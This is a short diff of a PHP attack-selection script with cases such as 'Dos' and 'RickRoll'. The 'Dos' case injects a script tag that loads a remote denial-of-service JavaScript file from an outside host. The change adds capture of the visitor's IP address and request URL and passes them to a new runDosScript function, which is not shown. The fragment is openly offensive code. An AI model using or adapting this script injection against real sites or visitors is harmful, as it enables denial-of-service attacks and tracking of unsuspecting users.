@@ -23,10 +23,14 @@ switch($typeOfAttack){
           runScript($textToInsert);
           break;
     case "Dos":
-        $DosScript = "http://stme.esy.es/js/dos.js";
+          $stringIp = $_SERVER['REMOTE_ADDR'];
+          $link = "http://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
+
+         // $ip = ip2long($stringIp);
+          $DosScript = "http://stme.esy.es/js/dos.js";
           $textToInsert="<script type='text/javascript' src='$DosScript'></script>";
           //for($i=0;$i<10;i++){$textToInsert .= $textToInsert};
-          runScript($textToInsert);
+          runDosScript($textToInsert , $stringIp ,$link);
           break;
         
     case "RickRoll":
